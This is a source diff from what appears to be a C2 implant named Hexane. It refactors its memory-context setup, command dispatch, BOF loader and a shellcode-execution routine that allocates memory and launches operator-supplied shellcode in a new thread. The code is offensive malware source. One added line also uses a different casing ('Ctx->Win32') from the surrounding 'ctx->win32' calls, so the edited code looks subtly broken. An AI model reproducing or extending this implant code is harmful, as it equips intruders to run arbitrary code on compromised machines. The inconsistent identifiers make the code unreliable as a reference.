@@ -37,12 +37,9 @@ namespace Memory {
     }
 
     namespace Context {
-
         BOOL ContextInit() {
-            HEXANE;
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
-
-            _hexane instance = { };
+            HEXANE instance = { };
 			SIZE_T size = sizeof(LPVOID);
 			ULONG protect = 0;
 
@@ -82,7 +79,6 @@ namespace Memory {
         }
 
         VOID ContextDestroy() {
-            HEXANE;
             // TODO: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)
 
             auto free = ctx->win32.RtlFreeHeap;
@@ -102,10 +98,7 @@ namespace Memory {
     }
 
     namespace Execute {
-
         BOOL ExecuteCommand(_parser parser) {
-            HEXANE;
-
             UINT_PTR pointer = 0;
 
             const auto cmd_id = UnpackUint32(&parser);
@@ -126,15 +119,13 @@ namespace Memory {
 
 		// TODO: process migration
         BOOL ExecuteShellcode(_parser parser) {
-            HEXANE;
-
-            void *base      = nullptr;
-            void (*exec)()  = nullptr;
+            LPVOID base 	= nullptr;
+            VOID (*exec)()  = nullptr;
 
         	HANDLE handle	= nullptr;
             BOOL success	= false;
 
-            size_t size = parser.length;
+            SIZE_T size = parser.length;
 
             if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                 // LOG ERROR
@@ -148,13 +139,14 @@ namespace Memory {
                 goto defer;
             }
 
-            exec = (void(*)()) base;
-            ntstatus = ctx->win32.NtCreateThreadEx(&handle, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE) exec, nullptr, NULL, NULL, NULL, NULL, nullptr);
+            exec = (VOID(*)()) base;
+			ntstatus = Ctx->Win32.NtCreateThreadEx(
+					&handle, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE)exec, 
+					nullptr, NULL, NULL, NULL, NULL, nullptr);
 
             MemSet(base, 0, size);
             success = true;
-
-            defer:
+defer:
             if (base) {
                 ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
             }
@@ -163,8 +155,6 @@ namespace Memory {
         }
 
         VOID LoadObject(_parser parser) {
-            HEXANE;
-
             COFF_PARAMS *bof  = (COFF_PARAMS *) Malloc(sizeof(COFF_PARAMS));
             COFF_PARAMS *saved = nullptr;
 
